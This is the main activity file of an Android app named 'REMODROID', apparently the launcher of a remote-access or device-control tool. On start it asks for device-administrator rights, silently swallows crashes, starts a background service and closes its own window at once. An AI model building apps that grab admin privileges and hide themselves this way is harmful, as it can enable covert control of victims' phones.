package com.remo;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.StrictMode;
import android.util.Log;
import com.remo.features.broadcastReceivers.DeviceAdmin;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("REMODROID", "Main Activity Started");
        Thread.setDefaultUncaughtExceptionHandler(
                new Thread.UncaughtExceptionHandler() {
                    @Override
                    public void uncaughtException(Thread thread, Throwable ex) {
                        Log.e("REMODROID", "Main Thread UncaughtException: " + ex.getMessage());
                    }
                });



        try {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName componentName = new ComponentName(this, DeviceAdmin.class);
            if (!devicePolicyManager.isAdminActive(componentName)) {
                Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
                startActivity(intent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }



        startService(new Intent(getApplicationContext(), MainService.class));

        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);


        onBackPressed();

    }

}
